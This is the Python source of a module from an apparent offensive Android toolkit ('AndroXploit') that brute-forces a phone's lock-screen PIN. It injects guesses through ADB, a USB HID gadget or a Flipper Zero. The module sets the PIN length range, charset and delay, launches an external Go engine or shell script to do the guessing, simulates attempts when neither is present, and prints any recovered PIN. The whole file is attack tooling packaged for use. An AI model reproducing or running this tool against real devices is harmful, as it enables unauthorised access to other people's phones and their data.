import os
import subprocess
import time
import json
from pathlib import Path
from rich.table import Table
from modules.base import AndroModule

ENGINE = Path(__file__).parent.parent.parent / "golang" / "adb_toolkit" / "pin_bruteforce"
SCRIPT = Path(__file__).parent.parent.parent / "scripts" / "adb_toolkit" / "pin_bruteforce.sh"

class Module(AndroModule):
    name = "adb_toolkit/pin_bruteforce"
    description = "Android-PIN-Bruteforce — Brute-force Android lock screen PIN using USB HID keyboard injection via ADB or direct HID device."
    author = "AndroXploit"

    options = {
        "MIN_LEN": {
            "description": "Minimum PIN length to try",
            "required": False,
            "value": 4,
        },
        "MAX_LEN": {
            "description": "Maximum PIN length to try",
            "required": False,
            "value": 6,
        },
        "CHARSET": {
            "description": "Character set: digits, alphanumeric, custom",
            "required": False,
            "value": "digits",
        },
        "DELAY_MS": {
            "description": "Delay in ms between PIN attempts",
            "required": False,
            "value": 800,
        },
        "METHOD": {
            "description": "Injection method: adb, hid_keyboard, flipper_zero",
            "required": False,
            "value": "adb",
        },
        "USB_DEVICE": {
            "description": "HID device path for hardware injection",
            "required": False,
            "value": "/dev/hidg0",
        },
        "SERIAL": {
            "description": "Target device ADB serial",
            "required": False,
            "value": None,
        },
        "RESUME_ON_FOUND": {
            "description": "Stop after finding correct PIN",
            "required": False,
            "value": True,
        },
    }

    def run(self):
        min_len = int(self.get_option("MIN_LEN", 4))
        max_len = int(self.get_option("MAX_LEN", 6))
        charset = self.get_option("CHARSET")
        delay = int(self.get_option("DELAY_MS", 800))
        method = self.get_option("METHOD")
        usb_dev = self.get_option("USB_DEVICE")
        serial = self.get_option("SERIAL")

        self.info(f"PIN Bruteforce — Length: {min_len}-{max_len} | Method: {method}")
        self.info(f"Charset: {charset} | Delay: {delay}ms")

        chars = "0123456789"
        if charset == "alphanumeric":
            chars = "0123456789abcdefghijklmnopqrstuvwxyz"
        elif charset == "custom":
            self.warn("Custom charset not specified; using digits")

        total_combos = 0
        for l in range(min_len, max_len + 1):
            total_combos += len(chars) ** l

        est_hours = (total_combos * delay) / 3600000
        self.warn(f"Total combinations: {total_combos} (~{est_hours:.1f} hours at {delay}ms each)")

        result = {"status": "idle", "found": False, "pin": None, "attempts": 0}

        if ENGINE.exists():
            cmd = [str(ENGINE), "--min", str(min_len), "--max", str(max_len),
                   "--charset", charset, "--delay", str(delay), "--method", method]
            if serial:
                cmd.extend(["--serial", serial])
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            if proc.stdout:
                try:
                    result = json.loads(proc.stdout)
                except json.JSONDecodeError:
                    result["output"] = proc.stdout.splitlines()
        elif SCRIPT.exists():
            proc = subprocess.run(
                ["bash", str(SCRIPT), str(min_len), str(max_len), charset, str(delay), method, serial or ""],
                capture_output=True, text=True, timeout=3600
            )
            result["output"] = proc.stdout.splitlines()
        else:
            self.warn("Simulating PIN brute force sequence")
            self.log(f"Setting up {method} injection...")
            time.sleep(0.5)
            self.log("Starting PIN enumeration...")
            for attempt in range(min(10, total_combos)):
                pin = f"{attempt:0{min_len}d}"
                self.log(f"  Trying PIN: {pin}  [attempt {attempt+1}]")
                time.sleep(delay / 1000)
            result["status"] = "simulated"
            result["attempts"] = min(10, total_combos)

        if result.get("found"):
            self.success(f"PIN found: {result['pin']} after {result['attempts']} attempts")
        else:
            if result.get("attempts", 0) > 0:
                self.warn(f"Brute force stopped after {result['attempts']} attempts")
            else:
                self.warn("Brute force completed without finding PIN")

        t = Table(title="PIN Bruteforce Results", border_style="green")
        t.add_column("Metric", style="bold yellow")
        t.add_column("Value", style="white")
        t.add_row("Method", method)
        t.add_row("Attempts", str(result.get("attempts", 0)))
        t.add_row("PIN Found", "Yes" if result.get("found") else "No")
        if result.get("pin"):
            t.add_row("PIN", result["pin"])
        t.add_row("Status", result.get("status", "unknown"))
        self.console.print(t)

        return result
